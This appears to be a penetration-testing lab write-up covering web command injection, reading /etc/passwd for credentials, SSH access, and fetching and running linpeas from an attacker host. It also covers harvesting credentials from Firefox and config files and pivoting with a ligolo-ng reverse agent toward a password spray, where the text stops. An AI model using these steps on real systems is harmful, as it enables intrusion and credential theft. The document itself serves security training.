# Temp1

## General Info





## Network Discovery

```bash
nmap -sn 192.168.80.0/24

Nmap scan report for 192.168.80.10
```

## Port Scanning

```bash
nmap -T4 -sV -p- --open -oN port_scan.txt 192.168.80.10

Nmap scan report for 192.168.80.10
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Web Enumration

In the email newsletter there is a Command Injection. We can read the /etc/passwd and obtain a clear-credential.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

```
privilege:x:1001:1001:Admin@962:/home/privilege:/bin/bash
```

## SSH Access

with the credentials obtained, let's try to access through SSH.

```bash
ssh privilege@192.168.80.10
> Admin@962
```

### Linux Enum with linpeas

```bash
# Attacker machine
peass
cd linpeas
python3 -m http.server 80

# target machine
wget http://10.10.200.56/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

We discovered:

* New network to pivoting

```bash
ens34: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.98.15  netmask 255.255.255.0  broadcast 192.168.98.255
        ether 00:50:56:96:e4:32  txqueuelen 1000  (Ethernet)
        RX packets 727  bytes 122997 (122.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1211  bytes 267261 (267.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 16  base 0x1000  
```

* Mozilla juicy DB

```
/home/privilege/.mozilla/firefox/b2rri1qd.default-release/places.sqlite
/home/privilege/.mozilla/firefox/b2rri1qd.default-release/credentialstate.sqlite
/home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage.sqlite

```

* Password in PHP config

```
/var/www/html/config.php:        $password = 'Web!@#$%';
```



### Creds in Firefoz Bookmarks

Print the Table `moz_bookmarks` of the places.sqlite db and we obtain a AD credential

{% code overflow="wrap" %}
```bash
sqlite3 places.sqlite
SELECT * FROM moz_bookmarks;

# query output
18|1|16|5|0|http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6|||1737028407427000|1737029666390000|tuXr2pTr03P2|1|7

```
{% endcode %}

Credential obteined:

```
john@child.warfare.corp:User1@#$%6
```



## Pivoting

With the other Network found make a pivot connection

{% code overflow="wrap" %}
```bash
#Attacker Machine, download proxy & agent :
#Proxy
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz

tar -xvzf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz

#Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz

python3 -m http.server 8080

wget http://10.10.200.56:80/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
tar -xvzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```
{% endcode %}

Set up the attacker machine

```bash
sudo ip tuntap add user kali mode tun ligolo

#Delete the 192.168.98.0/24 IP Range from the tun0 interface :
sudo ip route del 192.168.98.0/24 dev tun0

#Up the ligolo interface :
sudo ip link set ligolo up

#Add 192.168.98.0/24 IP range to the ligolo interface :
sudo ip route add 192.168.98.0/24 dev ligolo
```

```bash
# start the proxy on attacker machine
./proxy -selfcert -laddr 0.0.0.0:443

# start the agent on the target machine
./agent -connect 10.10.200.56:443 -ignore-cert
```

On the ligolo-ng proxy, check the session & start the tunnel.

```
session
start
```

Try to ping the device discovered into Mozilla Firefox

```bash
ping 192.168.98.30

PING 192.168.98.30 (192.168.98.30) 56(84) bytes of data.
64 bytes from 192.168.98.30: icmp_seq=1 ttl=64 time=100 ms
64 bytes from 192.168.98.30: icmp_seq=2 ttl=64 time=102 ms
```

## Network Discovery (Network 2)

Using SSH connection as Privilege user to Linux machine we can run the arp command to discover other device in the another networks

```
privilege@ubuntu-virtual-machine:~$ arp -a

? (192.168.80.1) at 00:50:56:96:c4:bf [ether] on ens32
? (192.168.98.2) at 00:50:56:96:1e:98 [ether] on ens34
? (192.168.98.30) at 00:50:56:96:f8:38 [ether] on ens34
? (192.168.98.1) at 00:50:56:96:0e:7d [ether] on ens34
? (192.168.98.120) at 00:50:56:96:70:ab [ether] on ens34
```

Now create a file with all host discovered (including the start machine)

{% code title="targets.txt" %}
```
192.168.98.2
192.168.98.15
192.168.98.30
192.168.98.120
```
{% endcode %}

Now try to do a Password Spray with AD credentials discovered before.

...
